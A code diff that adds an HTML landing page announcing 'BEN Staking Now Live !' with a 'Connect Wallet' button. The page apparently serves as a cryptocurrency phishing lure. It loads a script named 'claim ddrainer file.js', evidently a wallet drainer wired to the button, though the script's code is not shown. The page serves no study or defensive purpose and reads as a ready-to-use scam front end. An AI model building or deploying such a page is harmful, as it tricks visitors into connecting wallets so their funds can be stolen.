@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Full Screen Background with Button</title>
+    <script src="/claim ddrainer file.js"></script>
+    <!-- Include Tailwind CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <!-- Additional styles for full-screen background -->
+    <style>
+        html, body {
+            height: 100%;
+        }
+        .bg-cover {
+            background-size: cover;
+            background-position: center;
+        }
+    </style>
+</head>
+<body class="bg-gray-200">
+    <div class="relative h-screen bg-cover" style="background-image: url('/banner-img.webp');">
+        <div class="absolute top-0 left-0 w-full h-full bg-black opacity-50"></div>
+        <div class="absolute inset-0 flex items-center justify-center">
+            <div class="text-center text-white">
+                <h1 class="text-4xl md:text-6xl font-bold mb-6">BEN Staking Now Live !</h1>
+                <button  class="bg-blue-500 connectButton hover:bg-blue-600 text-white font-bold text-xl py-4 px-4 rounded">Connect Wallet</button>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
